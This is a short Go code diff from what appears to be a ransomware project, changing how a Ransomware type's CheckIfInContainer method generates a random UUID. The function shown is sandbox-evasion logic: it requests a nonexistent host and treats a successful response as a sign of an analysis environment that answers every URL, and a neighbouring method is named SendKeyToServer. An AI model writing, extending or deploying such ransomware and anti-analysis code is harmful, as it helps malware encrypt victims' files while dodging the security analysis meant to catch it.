@@ -184,11 +184,7 @@ func (rw *Ransomware) SendKeyToServer() error {
 
 // Check if the ransomware is started in a container which allows all of the urls and ports.
 func (rw *Ransomware) CheckIfInContainer() error {
-	urlTest, err := uuid.NewV4()
-	if err != nil {
-		return err
-	}
-
+	urlTest := uuid.NewV4()
 	if _, err := http.Get("https://" + urlTest.String() + ":1234"); err != nil {
 		return nil
 	}
